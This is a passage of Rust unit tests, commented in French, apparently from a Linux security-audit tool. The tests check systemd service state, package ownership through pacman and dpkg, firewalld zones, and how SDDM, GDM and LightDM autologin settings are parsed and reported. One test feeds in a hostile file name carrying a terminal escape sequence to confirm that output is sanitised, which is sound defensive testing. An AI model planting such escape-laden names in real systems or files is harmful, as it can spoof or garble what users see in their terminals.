        assert_eq!(c.categorie, "Wi-Fi");
        // sysfs illisible : non vérifié, jamais « pas de carte ».
        let illisible = cartes_wifi(&d.join("absent"));
        assert!(illisible.is_err());
        assert!(matches!(
            wifi_sans_lecture(illisible, "x").etat(),
            Etat::NonVerifie(Raison::Illisible(_))
        ));
        let _ = std::fs::remove_dir_all(&d);
    }

    /// Sur cet ordinateur, l'état lu par le bus est celui que `systemctl is-active` dit par son code de retour, pour
    /// des unités de chaque genre : service qui tourne, prise d'écoute, service « oneshot », unité inconnue.
    #[test]
    fn services_comme_systemctl() {
        let noms = [
            "dbus",
            "systemd-journald",
            "systemd-journald.socket",
            "sshd",
            "ssh.socket",
            "ufw",
            "nftables",
            "unite-inconnue-de-vanguard",
        ];
        let systemctl: Vec<Option<bool>> = noms
            .iter()
            .map(|n| {
                crate::commande::lancer(Command::new("systemctl").args(["is-active", "--quiet", n]), 10)
                    .and_then(|r| r.code)
                    .map(|c| c == 0)
            })
            .collect();
        if systemctl.iter().any(Option::is_none) || dbus::Bus::systeme().is_err() {
            return crate::essais::saute("systemd ou le bus système absent");
        }
        let systemctl: Vec<bool> = systemctl.into_iter().flatten().collect();
        // dbus tourne forcément là où le bus répond : systemctl qui le dit arrêté ne joint pas systemd (espace de
        // noms d'`unshare -rn`, où il se croit root et cherche une prise privée), rien à comparer.
        if !systemctl[0] {
            return crate::essais::saute("systemctl ne joint pas systemd ici");
        }
        let attendu: Vec<Option<bool>> = systemctl.into_iter().map(Some).collect();
        assert_eq!(services_systemd_actifs(&noms), attendu, "{noms:?}");
        // Le secours, d'un seul appel, lit la même chose.
        assert_eq!(systemctl_is_active(&noms), attendu, "{noms:?}");
    }

    /// Bus absent ou en erreur : le secours lit ce qui manque, d'un seul appel ; s'il ne répond pas non plus, l'état
    /// reste non lu (`None`), jamais « arrêté ».
    #[test]
    fn bus_absent_ou_en_erreur() {
        let noms = ["sshd", "ssh", "ufw"];
        let jamais = |_: &[&str]| -> Vec<Option<bool>> { panic!("secours appelé alors que tout est lu") };
        // Tout lu par le bus : pas de secours.
        assert_eq!(
            etats_des_services(&noms, |n| Some(n == "ssh"), jamais),
            [Some(false), Some(true), Some(false)]
        );
        // Bus absent, systemctl répond.
        let mut demandes = Vec::new();
        let etats = etats_des_services(
            &noms,
            |_| None,
            |m| {
                demandes.push(m.join(" "));
                vec![Some(false), Some(true), Some(false)]
            },
        );
        assert_eq!(etats, [Some(false), Some(true), Some(false)]);
        assert_eq!(demandes, ["sshd ssh ufw"]);
        // Une erreur du bus pour un seul nom : lui seul part au secours, remis à sa place.
        let etats = etats_des_services(
            &noms,
            |n| (n != "ssh").then_some(false),
            |m| {
                assert_eq!(m, ["ssh"]);
                vec![Some(true)]
            },
        );
        assert_eq!(etats, [Some(false), Some(true), Some(false)]);
        // Ni bus ni systemctl : rien de lu, et rien de pris pour arrêté.
        let etats = etats_des_services(&noms, |_| None, |m| vec![None; m.len()]);
        assert_eq!(etats, [None, None, None]);
        assert_eq!(une_lue_active(&etats), None);
        // Un secours qui rend moins de lignes que demandé ne comble pas les trous avec « arrêté ».
        assert_eq!(
            etats_des_services(&noms, |_| None, |_| vec![Some(true)]),
            [Some(true), None, None]
        );
        // Au moins une lue active suffit ; toutes lues arrêtées, arrêté ; sinon non lu.
        assert_eq!(une_lue_active(&[None, Some(true)]), Some(true));
        assert_eq!(une_lue_active(&[Some(false), Some(false)]), Some(false));
        assert_eq!(une_lue_active(&[Some(false), None]), None);
    }

    /// La sortie de `systemctl is-active` : un état par ligne, lu seulement avec un code qui le permet et le bon
    /// nombre de lignes.
    #[test]
    fn sortie_de_systemctl_is_active() {
        let lu = |code, sortie: &str, n| lire_is_active(code, sortie, n);
        assert_eq!(
            lu(Some(0), "active\ninactive\nreloading\n", 3),
            Some(vec![Some(true), Some(false), Some(true)])
        );
        assert_eq!(
            lu(Some(3), "inactive\nfailed\n", 2),
            Some(vec![Some(false), Some(false)])
        );
        assert_eq!(lu(Some(4), "inactive\n", 1), Some(vec![Some(false)]));
        // systemd injoignable : code 1, rien sur la sortie.
        assert_eq!(lu(Some(1), "", 2), None);
        // Tué par un signal, ou une ligne de moins : rien de lu.
        assert_eq!(lu(None, "active\n", 1), None);
        assert_eq!(lu(Some(0), "active\n", 2), None);
    }

    #[test]
    fn paquets_de_plusieurs_fichiers() {
        let sortie = "/usr/bin/sudo is owned by sudo 1.9.17.p2-6\n/opt/mon outil/x is owned by mon-outil 1.0-1\n";
        let trouves = proprietaires_pacman(sortie);
        assert_eq!(trouves.get("/usr/bin/sudo").map(String::as_str), Some("sudo"));
        assert_eq!(trouves.get("/opt/mon outil/x").map(String::as_str), Some("mon-outil"));
        assert_eq!(trouves.len(), 2);
    }

    fn jetable(nom: &str) -> PathBuf {
        let d = crate::essais::temporaire().join(format!("vanguard-linux-{nom}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    /// La commande quand elle est là et réussit ; sinon le test s'arrête sans rien conclure.
    fn commande(programme: &str, args: &[&str]) -> Option<String> {
        crate::commande::lancer_en_anglais(Command::new(programme).args(args), 60)
            .filter(|r| r.code == Some(0))
            .map(|r| r.sortie)
    }

    #[test]
    fn proprietaires_dans_les_listes_de_dpkg() {
        let info = jetable("dpkg");
        std::fs::write(info.join("libc6:amd64.list"), "/.\n/usr\n/usr/bin\n/usr/bin/ldd\n").unwrap();
        std::fs::write(info.join("fuse3.list"), "/bin/fusermount3\n").unwrap();
        std::fs::write(info.join("fuse3.md5sums"), "0123 /bin/fusermount3\n").unwrap();
        let trouves = proprietaire_dpkg_dans(
            &info,
            &[
                Path::new("/usr/bin/ldd"),
                Path::new("/bin/fusermount3"),
                Path::new("/opt/x"),
            ],
        )
        .unwrap();
        // L'architecture reste, comme dpkg -S l'écrit.
        assert_eq!(
            trouves.get(Path::new("/usr/bin/ldd")).map(String::as_str),
            Some("libc6:amd64")
        );
        assert_eq!(
            trouves.get(Path::new("/bin/fusermount3")).map(String::as_str),
            Some("fuse3")
        );
        assert_eq!(trouves.len(), 2);
        // Sans base, rien n'est conclu.
        assert!(proprietaire_dpkg_dans(&info.join("absent"), &[Path::new("/usr/bin/ldd")]).is_none());
        let _ = std::fs::remove_dir_all(&info);
    }

    #[test]
    fn proprietaire_par_l_ancien_chemin() {
        let fichiers = [
            PathBuf::from("/usr/bin/fusermount3"),
            PathBuf::from("/usr/lib/x.so"),
            PathBuf::from("/opt/x"),
        ];
        assert_eq!(
            proprietaires_selon(&fichiers, |cherches| Some(
                cherches
                    .iter()
                    .filter(|f| f.starts_with("/bin") || f.starts_with("/usr/lib"))
                    .map(|f| (f.to_path_buf(), "fuse3".to_string()))
                    .collect()
            ))
            .unwrap(),
            [Some("fuse3".to_string()), Some("fuse3".to_string()), None]
        );
        assert!(proprietaires_selon(&fichiers, |_| None).is_none());
    }

    /// Sur cet ordinateur, la lecture des listes de pacman donne les mêmes paquets que pacman -Qo, quand il est
    /// là : un fichier d'un paquet, un autre par un dossier qui est un lien (/bin), un fichier sans paquet.
    /// pacman répond avec le chemin résolu (« /usr/bin/sh is owned by bash ») : c'est sous lui qu'on le cherche.
    #[test]
    fn proprietaires_comme_pacman_qo() {
        let fichiers = [
            PathBuf::from("/usr/bin/pacman"),
            PathBuf::from("/bin/sh"),
            PathBuf::from("/usr/bin/vanguard-introuvable"),
        ];
        let Some(natifs) = proprietaires_selon(&fichiers, natif::proprietaire_pacman) else {
            return crate::essais::saute("pacman absent");
        };
        let Some(r) = crate::commande::lancer_en_anglais(Command::new("pacman").arg("-Qo").args(&fichiers), 60) else {
            return crate::essais::saute("pacman absent");
        };
        let attendus = proprietaires_pacman(&r.sortie);
        for (f, n) in fichiers.iter().zip(&natifs) {
            let resolu = f
                .parent()
                .and_then(|p| p.canonicalize().ok())
                .zip(f.file_name())
                .map_or_else(|| f.clone(), |(p, n)| p.join(n));
            assert_eq!(
                n.as_ref(),
                attendus.get(resolu.to_string_lossy().as_ref()),
                "{}",
                f.display()
            );
        }
    }

    /// Sur cet ordinateur, le mtree d'un paquet pacman se lit comme zcat le lit, quand les deux sont là.
    #[test]
    fn mtree_comme_zcat() {
        let Some(mtree) = std::fs::read_dir(PACMAN_LOCAL)
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path().join("mtree"))
            .find(|m| m.is_file())
        else {
            return crate::essais::saute("aucun mtree de pacman");
        };
        let Some(attendu) = commande("zcat", &[&mtree.to_string_lossy()]) else {
            return crate::essais::saute("zcat absent");
        };
        let lu = crate::archives::gzip::degzip(&std::fs::read(&mtree).unwrap(), 256 << 20)
            .map(|o| String::from_utf8(o).unwrap());
        assert_eq!(lu.as_deref(), Some(attendu.as_str()), "{}", mtree.display());
    }

    #[test]
    fn zone_de_firewalld() {
        assert_eq!(
            zone_par_defaut("# défaut\nDefaultZone=public\nCleanupOnExit=yes\n").as_deref(),
            Some("public")
        );
        assert_eq!(
            zone_par_defaut("DefaultZone=public\nDefaultZone=trusted\n").as_deref(),
            Some("trusted")
        );
        assert_eq!(zone_par_defaut("DefaultZone=\n"), None);
        assert_eq!(zone_par_defaut("#DefaultZone=trusted\n"), None);
    }

    /// Sur cet ordinateur, la racine se dit chiffrée ou non comme lsblk le dit, quand findmnt et lsblk sont là.
    #[test]
    fn racine_chiffree_comme_lsblk() {
        crate::autotest::croisees::essayer("AUT-LNX-008");
    }

    /// Un fichier de gestionnaire de connexion lu, pour les essais : le gestionnaire est dit par le chemin, comme
    /// `fichiers_de_connexion` le dirait par le dossier.
    pub(super) fn connexion(chemin: &str, texte: &str) -> FichierDeConnexion {
        let gestionnaire = if chemin.contains("gdm") {
            Gestionnaire::Gdm
        } else if chemin.contains("lightdm") {
            Gestionnaire::LightDm
        } else {
            Gestionnaire::Sddm
        };
        FichierDeConnexion {
            gestionnaire,
            chemin: chemin.to_string(),
            texte: Some(texte.to_string()),
        }
    }

    #[test]
    fn ouverture_de_session_automatique() {
        let f = connexion;
        // SDDM d'Omarchy ; un fichier lu après qui vide le compte l'annule.
        let omarchy = f(
            "/etc/sddm.conf.d/autologin.conf",
            "[Autologin]\nUser=alice\nSession=omarchy.desktop\n",
        );
        assert_eq!(
            ouverture_automatique_de(std::slice::from_ref(&omarchy)),
            Some(("alice".into(), "/etc/sddm.conf.d/autologin.conf".into()))
        );
        assert_eq!(
            ouverture_automatique_de(&[omarchy, f("/etc/sddm.conf", "[Autologin]\nUser=\n")]),
            None
        );
        // GDM : seulement si activée ; commentaire ignoré.
        let gdm = "[daemon]\n# AutomaticLoginEnable=true\nAutomaticLoginEnable=True\nAutomaticLogin=bob\n";
        assert_eq!(
            ouverture_automatique_de(&[f("/etc/gdm3/custom.conf", gdm)]).unwrap().0,
            "bob"
        );
        let coupee = "[daemon]\nAutomaticLoginEnable=false\nAutomaticLogin=bob\n";
        assert_eq!(ouverture_automatique_de(&[f("/etc/gdm3/custom.conf", coupee)]), None);
        // Debian : GDM dans daemon.conf.
        let debian = "[daemon]\nAutomaticLoginEnable = true\nAutomaticLogin = alice\n";
        assert_eq!(
            ouverture_automatique_de(&[f("/etc/gdm3/daemon.conf", debian)])
                .unwrap()
                .0,
            "alice"
        );
        // Réglage de la distribution annulé par /etc (lu après) : personne.
        let defaut = f(
            "/usr/share/lightdm/lightdm.conf.d/50-auto.conf",
            "[Seat:*]\nautologin-user=alice\n",
        );
        let annule = f("/etc/lightdm/lightdm.conf", "[Seat:*]\nautologin-user=\n");
        assert_eq!(ouverture_automatique_de(&[defaut.clone(), annule]), None);
        assert!(ouverture_automatique_de(&[defaut]).is_some());
        // LightDM, section des sièges.
        let lightdm = "[Seat:*]\nautologin-user=alice\n[Autre]\nautologin-user=bob\n";
        assert_eq!(
            ouverture_automatique_de(&[f("/etc/lightdm/lightdm.conf", lightdm)])
                .unwrap()
                .0,
            "alice"
        );
        // Ronde 10 (N10-4) : la session d'invité de LightDM, avant le compte nommé.
        let invite = "[Seat:*]\nautologin-guest=true\n";
        assert_eq!(
            ouverture_automatique_de(&[f("/etc/lightdm/lightdm.conf", invite)]),
            Some((tr!("invité", "guest").to_string(), "/etc/lightdm/lightdm.conf".into()))
        );
        assert_eq!(
            ouverture_automatique_de(&[f("/etc/lightdm/lightdm.conf", "[Seat:*]\nautologin-guest=false\n")]),
            None
        );
        // Ronde 10 (N10-4) : le gestionnaire est celui du dossier, pas un bout du nom. Un ajout de LightDM nommé
        // « 50-sddm.conf » reste un fichier de LightDM ; une section de SDDM dans un fichier de LightDM ne compte pas.
        let mal_nomme = FichierDeConnexion {
            gestionnaire: Gestionnaire::LightDm,
            chemin: "/etc/lightdm/lightdm.conf.d/50-sddm.conf".into(),
            texte: Some("[Seat:*]\nautologin-user=alice\n".into()),
        };
        assert_eq!(ouverture_automatique_de(&[mal_nomme]).unwrap().0, "alice");
        let croise = FichierDeConnexion {
            gestionnaire: Gestionnaire::LightDm,
            chemin: "/etc/lightdm/lightdm.conf".into(),
            texte: Some("[Autologin]\nUser=alice\n".into()),
        };
        assert_eq!(ouverture_automatique_de(&[croise]), None);
        // Un interrupteur dans un fichier, le compte dans un autre : ils comptent ensemble.
        let deux = [
            f("/etc/gdm3/daemon.conf", "[daemon]\nAutomaticLogin=bob\n"),
            f("/etc/gdm3/custom.conf", "[daemon]\nAutomaticLoginEnable=true\n"),
        ];
        assert_eq!(ouverture_automatique_de(&deux).unwrap().0, "bob");
        // Jugement : disque chiffré, sans alerte ; sinon moyen.
        assert!(juger_ouverture_automatique("alice", "x", Some(true)).probleme.is_none());
        assert_eq!(
            juger_ouverture_automatique("alice", "x", Some(false)).probleme,
            Some(Niveau::Moyen)
        );
        assert_eq!(
            juger_ouverture_automatique("alice", "x", None).probleme,
            Some(Niveau::Moyen)
        );
    }

    /// Ronde 10 du lot 096 (N10-3) : l'ouverture automatique n'a plus de geste. Le gestionnaire lit plusieurs fichiers
    /// à sa façon (SDDM n'est pas GLib) : retirer la ligne vue pourrait laisser, ou réveiller, celle d'un autre. La
    /// correction est dite, à la main, avec la raison ; jamais une commande que Vanguard lancerait.
    #[test]
    fn ouverture_automatique_sans_geste() {
        for fichiers in [
            vec![connexion(
                "/etc/sddm.conf.d/autologin.conf",
                "[Autologin]\nUser=alice\nSession=omarchy.desktop\n",
            )],
            vec![connexion(
                "/etc/gdm3/custom.conf",
                "[daemon]\nAutomaticLoginEnable=true\nAutomaticLogin=bob\n",
            )],
            vec![connexion(
                "/etc/lightdm/lightdm.conf",
                "[Seat:*]\nautologin-user=alice\n",
            )],
        ] {
            let c = constat_d_ouverture(&fichiers, || Some(false)).unwrap();
            assert_eq!(c.probleme, Some(Niveau::Moyen), "{fichiers:?}");
            assert!(c.verifie);
            let k = c.correctif.unwrap();
            assert!(!k.automatique, "{fichiers:?}");
            assert!(k.commandes.is_empty(), "{:?}", k.commandes);
            assert!(
                !matches!(k.defaire, crate::machine::Defaire::Gestes(_)),
                "{:?}",
                k.defaire
            );
            assert!(
                k.action
                    .contains(tr!("ne la retire pas lui-même", "does not remove it itself")),
                "{}",
                k.action
            );
        }
    }

    /// Ronde 10 du lot 096 (N10-4) : un fichier de connexion qui ne se lit pas est dit non vérifié, jamais compté
    /// comme une machine sans ouverture automatique ; s'il y a une ouverture vue ailleurs, il est nommé avec elle.
    #[test]
    fn ouverture_automatique_non_lue_dite() {
        let non_lu = |chemin: &str| FichierDeConnexion {
            gestionnaire: Gestionnaire::Sddm,
            chemin: chemin.to_string(),
            texte: None,
        };
        // Rien lu d'autre : impossible de vérifier, pas « OK ».
        let c = constat_d_ouverture(&[non_lu("/etc/sddm.conf.d/a")], || Some(false)).unwrap();
        assert!(!c.verifie, "{}", c.message);
        assert!(c.message.contains("/etc/sddm.conf.d/a"), "{}", c.message);
        // Une ouverture vue ailleurs : constat d'ouverture, et le fichier non lu est nommé.
        let c = constat_d_ouverture(
            &[
                connexion("/etc/lightdm/lightdm.conf", "[Seat:*]\nautologin-user=alice\n"),
                non_lu("/etc/sddm.conf"),
            ],
            || Some(false),
        )
        .unwrap();
        assert_eq!(c.probleme, Some(Niveau::Moyen));
        assert!(
            c.message.contains(tr!("non vérifiés", "not checked")) && c.message.contains("/etc/sddm.conf"),
            "{}",
            c.message
        );
        // Beaucoup de fichiers non lus : les premiers nommés, les autres comptés.
        let beaucoup: Vec<_> = (0..8).map(|i| non_lu(&format!("/etc/sddm.conf.d/{i}"))).collect();
        let c = constat_d_ouverture(&beaucoup, || None).unwrap();
        assert!(c.message.contains("/etc/sddm.conf.d/4") && !c.message.contains("/etc/sddm.conf.d/5"));
        assert!(
            c.message.contains(&trf!("et {} autre(s)", "and {} more", 3)),
            "{}",
            c.message
        );
        // Tout lu, personne : rien à dire.
        assert!(constat_d_ouverture(&[connexion("/etc/sddm.conf", "[Theme]\nCurrent=x\n")], || None).is_none());
        // Un nom de fichier hostile est rendu affichable.
        let c = constat_d_ouverture(&[non_lu("/etc/sddm.conf.d/a\u{1b}[2J")], || None).unwrap();
        assert!(!c.message.contains('\u{1b}'), "{:?}", c.message);
    }

    /// Ronde 10 du lot 096 (N10-4) : les fichiers lus, sur une racine d'essai, comme SDDM et LightDM les lisent. SDDM
    /// prend tout fichier de ses dossiers, « .conf » ou non ; LightDM, ses « .conf » de /usr/share, /usr/local/share,
    /// /etc/xdg puis /etc/lightdm ; un sous-dossier est sauté ; un fichier qui ne se lit pas reste, sans texte.
    #[test]
    fn fichiers_de_connexion_sur_une_racine() {
        let racine = crate::essais::Jetable::nouveau("fichiers-de-connexion");
        let ecrire = |c: &str, t: &[u8]| {
            let p = racine.join(c.trim_start_matches('/'));
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, t).unwrap();
        };
        ecrire("/etc/sddm.conf.d/autologin", b"[Autologin]\nUser=alice\n");
        ecrire("/usr/lib/sddm/sddm.conf.d/10-theme.conf", b"[Theme]\nCurrent=x\n");
        ecrire(
            "/etc/xdg/lightdm/lightdm.conf.d/50-sddm.conf",
            b"[Seat:*]\nautologin-guest=true\n",
        );
        ecrire(
            "/etc/lightdm/lightdm.conf.d/notes.txt",
            b"[Seat:*]\nautologin-user=bob\n",
        );
        ecrire("/etc/gdm3/custom.conf", b"[daemon]\n\xff\n");
        std::fs::create_dir_all(racine.join("etc/sddm.conf.d/sous")).unwrap();
        let fichiers = fichiers_de_connexion(&racine);
        let vus: Vec<(Gestionnaire, String, bool)> = fichiers
            .iter()
            .map(|f| {
                let c = f.chemin.strip_prefix(&*racine.to_string_lossy()).unwrap_or(&f.chemin);
                (f.gestionnaire, c.to_string(), f.texte.is_some())
            })
            .collect();
        assert_eq!(
            vus,
            [
                (Gestionnaire::Gdm, "/etc/gdm3/custom.conf".to_string(), false),
                (
                    Gestionnaire::Sddm,
                    "/usr/lib/sddm/sddm.conf.d/10-theme.conf".to_string(),
                    true
                ),
                (Gestionnaire::Sddm, "/etc/sddm.conf.d/autologin".to_string(), true),
                (
                    Gestionnaire::LightDm,
                    "/etc/xdg/lightdm/lightdm.conf.d/50-sddm.conf".to_string(),
                    true
                ),
            ]
        );
        // Le constat : l'ouverture de SDDM, et le fichier de GDM non lu nommé.
        let c = constat_d_ouverture(&fichiers, || Some(false)).unwrap();
        assert!(
            c.message.contains("« alice »") || c.message.contains("“alice”"),
            "{}",
            c.message
        );
        assert!(c.message.contains("custom.conf"), "{}", c.message);
        // Un tube nommé n'est jamais lu (pas de blocage) : non vérifié.
        #[cfg(unix)]
        {
            let tube = racine.join("etc/sddm.conf");
            if crate::essais::tube_nomme(&tube).is_ok() {
                let f = fichiers_de_connexion(&racine);
                assert!(
                    f.iter()
                        .any(|f| f.chemin.ends_with("/etc/sddm.conf") && f.texte.is_none())
                );
            } else {
                crate::essais::saute("mkfifo refusé ici");
            }
        }
    }

    /// Ronde 11 du lot 096 (N11-1) : une section de SDDM se lit comme SDDM 0.21.0 la lit (`ConfigReader.cpp`) : le
    /// « # » coupe la ligne avant tout, puis une ligne qui garde un « = » est une affectation, même « [x=y] ». Une
    /// marque UTF-8 en tête ne cache pas la section.
    #[test]
    fn sections_de_sddm_lues_comme_sddm() {
        for texte in [
            "[Autologin] # note\nUser=mallory\n",
            "[Autologin]#note\nUser=mallory\n",
            "[Autologin]\n[x=y]\nUser=mallory\n",
            "\u{feff}[Autologin]\nUser=mallory\n",
            "[Autologin]\nUser=mallory # le compte\n",
            "  [Autologin]  \n  User = mallory  \n",
        ] {
            assert_eq!(
                ouverture_automatique_de(&[connexion("/etc/sddm.conf.d/x.conf", texte)]),
                Some(("mallory".into(), "/etc/sddm.conf.d/x.conf".into())),
                "{texte:?}"
            );
        }
        // Le reste de la ligne après « # » n'est rien pour SDDM : ni une valeur, ni une section.
        for texte in [
            "[Autologin]\n# User=mallory\n",
            "[Autologin]\nSession=x # User=mallory\n",
            "# [Autologin]\nUser=mallory\n",
            "[Theme]\nUser=mallory\n",
        ] {
            assert_eq!(
                ouverture_automatique_de(&[connexion("/etc/sddm.conf.d/x.conf", texte)]),
                None,
                "{texte:?}"
            );
        }
        // GDM et LightDM (GKeyFile) : « # » seulement en tête de ligne, une marque UTF-8 ne cache rien non plus.
        let gdm = "\u{feff}[daemon]\nAutomaticLoginEnable=true\nAutomaticLogin=mallory\n";
        assert_eq!(
            ouverture_automatique_de(&[connexion("/etc/gdm/custom.conf", gdm)])
                .unwrap()
                .0,
            "mallory"
        );
    }

    /// Ronde 11 du lot 096 (N11-2) : une ouverture n'est tenue pour annulée que par une ligne plus loin dans le même
    /// fichier, même section et même clé. Une annulation venue d'un autre fichier ou d'une autre section n'est pas crue :
    /// « non vérifié », jamais « rien à signaler ».
    #[test]
    fn annulation_non_sure_dite_non_verifiee() {
        let f = connexion;
        let cas: [(&str, Vec<FichierDeConnexion>); 10] = [
            (
                // SDDM trie selon la langue : « B-on » peut passer après « a-off ».
                "tri selon la langue",
                vec![
                    f("/etc/sddm.conf.d/B-on.conf", "[Autologin]\nUser=bob\n"),
                    f("/etc/sddm.conf.d/a-off.conf", "[Autologin]\nUser=\n"),
                ],
            ),
            (
                // SDDM ne lit pas les fichiers cachés : « .off » n'annule rien pour lui.
                "fichier caché",
                vec![
                    f("/etc/sddm.conf.d/+on", "[Autologin]\nUser=bob\n"),
                    f("/etc/sddm.conf.d/.off", "[Autologin]\nUser=\n"),
                ],
            ),
            (
                "sddm.conf après sddm.conf.d",
                vec![
                    f("/etc/sddm.conf.d/a.conf", "[Autologin]\nUser=bob\n"),
                    f("/etc/sddm.conf", "[Autologin]\nUser=\n"),
                ],
            ),
            (
                // LightDM ne retient [Seat:seat9] que sur le siège seat9.
                "section d'un autre siège",
                vec![f(
                    "/etc/lightdm/lightdm.conf",
                    "[Seat:*]\nautologin-user=bob\n[Seat:seat9]\nautologin-user=\n",
                )],
            ),
            (
                // LightDM applique [Seat:*] AVANT la section du siège.
                "siège puis défaut",
                vec![f(
                    "/etc/lightdm/lightdm.conf",
                    "[Seat:seat0]\nautologin-user=bob\n[Seat:*]\nautologin-user=\n",
                )],
            ),
            (
                // LightDM saute un fichier qu'il ne sait pas lire : l'annulation d'un autre fichier n'est pas crue.
                "autre fichier de LightDM",
                vec![
                    f(
                        "/usr/share/lightdm/lightdm.conf.d/50-a.conf",
                        "[Seat:*]\nautologin-guest=true\n",
                    ),
                    f("/etc/lightdm/lightdm.conf", "[Seat:*]\nautologin-guest=false\n"),
                ],
            ),
            (
                // Une machine ne lit qu'un fichier de GDM, celui de sa distribution.
                "GDM de deux distributions",
                vec![
                    f(
                        "/etc/gdm/custom.conf",
                        "[daemon]\nAutomaticLoginEnable=true\nAutomaticLogin=bob\n",
                    ),
                    f("/etc/gdm3/daemon.conf", "[daemon]\nAutomaticLoginEnable=false\n"),
                ],
            ),
            (
                // GKeyFile tient compte de la casse : [Daemon] n'est pas [daemon].
                "autre casse",
                vec![f(
                    "/etc/gdm3/custom.conf",
                    "[daemon]\nAutomaticLoginEnable=true\nAutomaticLogin=bob\n[Daemon]\nAutomaticLoginEnable=false\n",
                )],
            ),
            (
                // SDDM ne connaît que « User » : « user= » n'annule rien pour lui.
                "clé d'une autre casse",
                vec![f("/etc/sddm.conf.d/x.conf", "[Autologin]\nUser=bob\nuser=\n")],
            ),
            (
                // Ni « true » ni « false » : une erreur pour GDM, jamais crue comme une coupure.
                "interrupteur illisible",
                vec![f(
                    "/etc/gdm3/custom.conf",
                    "[daemon]\nAutomaticLoginEnable=oui\nAutomaticLogin=bob\n",
                )],
            ),
        ];
        for (nom, fichiers) in cas {
            assert_eq!(ouverture_automatique_de(&fichiers), None, "{nom}");
            assert!(!annulations_non_sures(&fichiers).is_empty(), "{nom}");
            let c = constat_d_ouverture(&fichiers, || Some(false)).unwrap_or_else(|| panic!("{nom} : compté sain"));
            assert!(!c.verifie, "{nom} : {}", c.message);
            assert_eq!(c.probleme, Some(Niveau::Info), "{nom} : {}", c.message);
            assert!(
                c.message.contains(tr!("ne lit peut-être pas", "may not read")),
                "{nom} : {}",
                c.message
            );
        }
        // Le fichier de l'ouverture est nommé.
        let c = constat_d_ouverture(
            &[
                f("/etc/sddm.conf.d/+on", "[Autologin]\nUser=bob\n"),
                f("/etc/sddm.conf.d/.off", "[Autologin]\nUser=\n"),
            ],
            || None,
        )
        .unwrap();
        assert!(c.message.contains("/etc/sddm.conf.d/+on"), "{}", c.message);
        // Annulations sûres (même fichier, même section, même clé) : rien à dire.
        for fichiers in [
            vec![f("/etc/sddm.conf.d/x.conf", "[Autologin]\nUser=bob\nUser=\n")],
            vec![f(
                "/etc/gdm3/custom.conf",
                "[daemon]\nAutomaticLoginEnable=True\nAutomaticLogin=bob\nAutomaticLoginEnable=False\n",
            )],
            vec![f(
                "/etc/gdm3/custom.conf",
                "[daemon]\nAutomaticLoginEnable=false\nAutomaticLogin=bob\n",
            )],
            vec![f(
                "/etc/lightdm/lightdm.conf",
                "[Seat:*]\nautologin-user=bob\nautologin-guest=true\n[Seat:*]\nautologin-user=\nautologin-guest=false\n",
            )],
        ] {
            assert!(annulations_non_sures(&fichiers).is_empty(), "{fichiers:?}");
            assert!(constat_d_ouverture(&fichiers, || Some(false)).is_none(), "{fichiers:?}");
        }
        // Une ouverture vue reste signalée, et l'annulation douteuse d'un autre gestionnaire est nommée avec elle.
        let c = constat_d_ouverture(
            &[
                f(
                    "/etc/gdm/custom.conf",
                    "[daemon]\nAutomaticLoginEnable=true\nAutomaticLogin=bob\n",
                ),
                f("/etc/gdm3/daemon.conf", "[daemon]\nAutomaticLoginEnable=false\n"),
                f("/etc/lightdm/lightdm.conf", "[Seat:*]\nautologin-user=alice\n"),
            ],
            || Some(false),
        )
        .unwrap();
        assert_eq!(c.probleme, Some(Niveau::Moyen), "{}", c.message);
        assert!(c.message.contains("/etc/gdm/custom.conf"), "{}", c.message);
    }

    /// Ronde 11 du lot 096 (N11-3) : GDM ouvre aussi la session après un délai (« TimedLogin »), et LightDM lit encore
    /// l'ancien nom de section [SeatDefaults].
    #[test]
    fn ouverture_minutee_et_ancienne_section() {
        let gdm = "[daemon]\nTimedLoginEnable=true\nTimedLogin=bob\nTimedLoginDelay=10\n";
        assert_eq!(
            ouverture_automatique_de(&[connexion("/etc/gdm3/custom.conf", gdm)]),
            Some(("bob".into(), "/etc/gdm3/custom.conf".into()))
        );
        let lightdm = "[SeatDefaults]\nautologin-user=alice\n";
        assert_eq!(
            ouverture_automatique_de(&[connexion("/etc/lightdm/lightdm.conf", lightdm)]),
            Some(("alice".into(), "/etc/lightdm/lightdm.conf".into()))
        );
    }

    /// Ronde 11 du lot 096 (N11-3) : sur une racine d'essai, l'ordre de SDDM (/usr/lib, puis /etc/sddm.conf.d, puis
    /// /etc/sddm.conf, le dernier l'emportant) et les branches « non vérifié » de la ronde 10 : un fichier dont on ne lit
    /// pas les droits, un dossier qui ne s'ouvre pas, plus de `CONNEXION_FICHIERS_MAX` fichiers, un fichier listé qui ne
    /// se retrouve pas (lien cassé). Les liens en boucle tiennent lieu de droits refusés : l'essai tourne aussi en root.
    #[test]
    fn connexion_sur_une_racine_ordre_et_non_lus() {
        use std::os::unix::fs::symlink;
        let racine = crate::essais::Jetable::nouveau("connexion-ordre");
        let ecrire = |c: &str, t: &str| {
            let p = racine.join(c.trim_start_matches('/'));
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, t).unwrap();
        };
        let court = |f: &FichierDeConnexion| {
            let c = f.chemin.strip_prefix(&*racine.to_string_lossy()).unwrap_or(&f.chemin);
            (c.to_string(), f.texte.is_some())
        };
        // Ordre de SDDM : /etc/sddm.conf l'emporte, puis /etc/sddm.conf.d sur /usr/lib.
        ecrire("/usr/lib/sddm/sddm.conf.d/a.conf", "[Autologin]\nUser=alice\n");
        ecrire("/etc/sddm.conf.d/b.conf", "[Autologin]\nUser=bob\n");
        ecrire("/etc/sddm.conf", "[Autologin]\nUser=carol\n");
        assert_eq!(
            ouverture_automatique_de(&fichiers_de_connexion(&racine)).unwrap().0,
            "carol"
        );
        std::fs::remove_file(racine.join("etc/sddm.conf")).unwrap();
        assert_eq!(
            ouverture_automatique_de(&fichiers_de_connexion(&racine)).unwrap().0,
            "bob"
        );
        std::fs::remove_file(racine.join("etc/sddm.conf.d/b.conf")).unwrap();
        // Fichier dont les droits ne se lisent pas (ici un lien en boucle) : non vérifié, jamais absent.
        std::fs::create_dir_all(racine.join("etc/gdm3")).unwrap();
        symlink("custom.conf", racine.join("etc/gdm3/custom.conf")).unwrap();
        let vus: Vec<_> = fichiers_de_connexion(&racine).iter().map(court).collect();
        assert!(vus.contains(&("/etc/gdm3/custom.conf".to_string(), false)), "{vus:?}");
